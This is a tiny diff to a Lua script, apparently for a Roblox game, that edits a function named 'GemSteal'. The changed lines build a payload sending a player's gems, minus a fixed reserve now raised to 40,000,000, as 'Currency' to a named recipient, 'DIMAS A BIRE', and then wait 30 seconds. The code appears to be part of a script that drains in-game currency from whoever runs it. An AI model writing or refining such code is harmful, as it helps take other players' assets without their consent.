@@ -29,7 +29,7 @@ local function GemSteal()
                         [2] = "DIMAS A BIRE",
                         [3] = "Currency",
                         [4] = GemId,
-                        [5] = GemAmount1 - 30010000
+                        [5] = GemAmount1 - 40000000
                     }
             if waited == false then
                 task.wait(30)
